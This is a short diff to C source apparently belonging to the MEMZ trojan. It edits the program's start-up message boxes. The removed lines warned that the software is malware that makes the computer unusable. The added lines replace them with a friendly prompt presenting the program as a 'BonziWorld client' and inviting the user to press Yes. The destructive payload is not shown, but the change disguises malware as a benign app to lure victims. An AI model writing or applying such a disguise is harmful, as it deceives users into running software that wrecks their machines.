@@ -46,15 +46,15 @@ void main() {
 		}
 	} else {
 		// Another very ugly formatting
-		if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
-This malware will harm your computer and makes it unusable.\r\n\
-If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
-If you know what this malware does and are using a safe environment to test, \
+		if (MessageBoxA(NULL, "Hello from bonziworld.\r\n\
+This is our new client.\r\n\
+If you don't want our new client, press no..\r\n\
+If you want to use it, \
 press Yes to start it.\r\n\r\n\
-DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
-MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
-THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
-STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
+Do you want to execute the BonziWorld client?", "BonziWORLD", MB_YESNO | MB_ICONWARNING) != IDYES ||
+MessageBoxA(NULL, "BonziWorld!\r\n\r\n\
+But first!\r\n\
+Are you sure?", "BonziWORLD", MB_YESNO | MB_ICONWARNING) != IDYES) {
 			ExitProcess(0);
 		}
 
